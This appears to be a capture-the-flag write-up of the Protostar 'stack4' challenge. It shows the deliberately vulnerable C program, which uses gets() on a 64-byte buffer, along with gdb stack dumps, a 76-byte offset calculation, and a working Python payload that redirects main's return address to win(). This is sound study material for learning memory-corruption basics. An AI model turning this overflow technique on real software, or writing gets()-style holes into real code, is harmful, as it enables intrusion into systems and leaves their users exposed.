# STACK 4

## SOURCE CODE

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv) 	// we'll overwrite the return value of main function
{
  char buffer[64];

  gets(buffer);  					// vuln is here, gets function does not limit size of input
}
```

## IDEA

- The idea is change the return address of main function to address of win function, so when main function finished, it will return to win function instead of return to the function that called the main function.

## DETAIL

- 0x080483f4 is win address, this address will be "\xf4\x83\x04\x08" in payload

- We can find the return address of main function when we run inside main function, it's on top of stack: 0xb7eadc76, this is because we have not push ebp yet or do something inside main function.

```
				(gdb) x/50xw$esp
				0xbffffcbc:     0xb7eadc76      0x00000001      0xbffffd64      0xbffffd6c
				0xbffffccc:     0xb7fe1848      0xbffffd20      0xffffffff      0xb7ffeff4
				0xbffffcdc:     0x0804824b      0x00000001      0xbffffd20      0xb7ff0626
													.....
```

- And we has ebp's value of the function that call the main function:

```
				(gdb) info registers
				eax            0xbffffd64       -1073742492
				ecx            0xf04f1569       -263252631
				edx            0x1      1
				ebx            0xb7fd7ff4       -1208123404
				esp            0xbffffcbc       0xbffffcbc
				ebp            0xbffffd38       0xbffffd38
									.....
````

- So address of return address is 0xbffffcbc, we will enter some input to find where "buffer" variable write on stack, and then we calculate the distance to overwrite.

```
				aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
				16      in stack4/stack4.c
				0x0804841d <main+21>:    c9     leave
				0x0804841e <main+22>:    c3     ret
				(gdb) x/50xw$esp
				0xbffffc60:     0xbffffc70      0xb7ec6165					0xbffffc78				0xb7eada75

	start ->    0xbffffc70:     0x61616161      0x61616161					0x61616161				0x61616161
				0xbffffc80:     0x61616161      0x61616161					0x61616161				0x61616161
				0xbffffc90:     0x61616161      0x61616161					0x61616161				0x61616161
				0xbffffca0:     0x61616161      0x61616161					0x61616161				0x61616161   <- end 
				0xbffffcb0:    (0x08048400      0x00000000)	<- padding 		0xbffffd38 <- (ebp)		0xb7eadc76   <- this is ret

				0xbffffcc0:     0x00000001      0xbffffd64					0xbffffd6c				0xb7fe1848
														......
```

- This challenge has some difference from stack3 challenge, the distance between "buffer" variable and return address of main function is not sizeof(buffer) + sizeof(stack), we have some extra space for padding, I don't have much understand about that, but when I debug this program, I see it has 2*4 bytes for padding.

- So, we have to overwrite:
	+ 64 bytes for buffer
	+ 4 bytes for ebp reservation on stack
	+ 8 bytes for padding
	> total we have to overwrite 64 + 4 + 8 = 76 bytes to reach to return address of main function

- He he, Let's make a payload to exploit this :3

## EXPLOIT

- Payload:

```
		python -c 'print("a"*76 + "\xf4\x83\x04\x08")' | ./stack4
```

## RESULT
		$ python -c 'print("a"*76 + "\xf4\x83\x04\x08")' | ./stack4
		code flow successfully changed
		Segmentation fault
